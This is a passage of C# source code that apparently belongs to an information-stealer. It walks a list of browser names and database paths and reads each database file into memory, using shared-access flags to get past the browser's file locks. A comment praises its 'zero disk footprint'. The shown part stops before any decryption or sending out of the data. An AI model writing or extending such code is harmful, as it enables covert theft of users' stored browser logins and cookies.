				}
			}
			catch
			{
			}

			foreach (Tuple<string, string> item3 in list2)
			{
				string browserName = item3.Item1;
				string dbPath = item3.Item2;
				if (!File.Exists(dbPath))
				{
					continue;
				}

				byte[] bytes = null;
				try
				{
					// Zero disk footprint: In-memory reading with FileShare to avoid browser file locks
					using (FileStream fs = new FileStream(dbPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete))
					{
						int readLen = (int)Math.Min(fs.Length, 33554432L); // 32 MB max
						bytes = new byte[readLen];
						int totalRead = 0;
						while (totalRead < readLen)
						{
							int r = fs.Read(bytes, totalRead, readLen - totalRead);
							if (r <= 0) break;
							totalRead += r;
						}
						if (totalRead < readLen)
						{
							Array.Resize(ref bytes, totalRead);
						}
					}
				}
				catch
				{
				}

				if (bytes == null || bytes.Length < 100)
				{
					continue;
				}

